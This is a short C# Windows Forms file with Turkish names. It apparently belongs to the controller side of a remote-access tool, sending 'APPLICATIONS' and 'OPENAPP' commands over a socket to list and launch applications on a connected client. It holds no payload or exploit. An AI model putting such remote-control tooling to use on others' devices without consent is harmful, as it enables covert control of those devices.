using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Uygulamalar : Form
    {
        Socket socket; public string ID = "";
        public Uygulamalar(Socket sck, string aydi)
        {
            InitializeComponent();
            socket = sck; ID = aydi;
        }

        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("APPLICATIONS", "[VERI][0x09]", socket);
            }
            catch (Exception) { }
        }

        private void açToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("OPENAPP", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", socket);
            }
            catch (Exception) { }
        }
    }
}
